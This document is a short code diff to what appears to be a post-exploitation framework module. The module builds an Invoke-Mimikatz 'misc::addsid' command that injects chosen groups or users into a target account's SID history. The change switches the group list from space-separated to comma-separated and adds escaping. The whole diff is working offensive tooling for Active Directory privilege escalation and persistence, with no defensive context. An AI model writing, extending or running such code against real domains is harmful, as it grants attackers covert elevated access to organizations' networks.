@@ -44,7 +44,7 @@ class Module:
                 'Value'         :   ''                
             },
             'Groups' : {
-                'Description'   :   'Groups/users to add to the sidhistory of the target user (space-separated).',
+                'Description'   :   'Groups/users to add to the sidhistory of the target user (COMMA-separated).',
                 'Required'      :   True,
                 'Value'         :   ''
             }
@@ -77,8 +77,11 @@ class Module:
 
         script = moduleCode
 
+        # ridiculous escape format
+        groups = " ".join(['"\\""'+group.strip().strip("'\"")+'"""' for group in self.options["Groups"]['Value'].split(",")])
+
         # build the custom command with whatever options we want
-        command = "misc::addsid "+self.options["User"]['Value'] + " " + self.options["Groups"]['Value']
+        command = '""misc::addsid '+self.options["User"]['Value'] + ' ' + groups
 
         # base64 encode the command to pass to Invoke-Mimikatz
         script += "Invoke-Mimikatz -Command '\"" + command + "\"';"
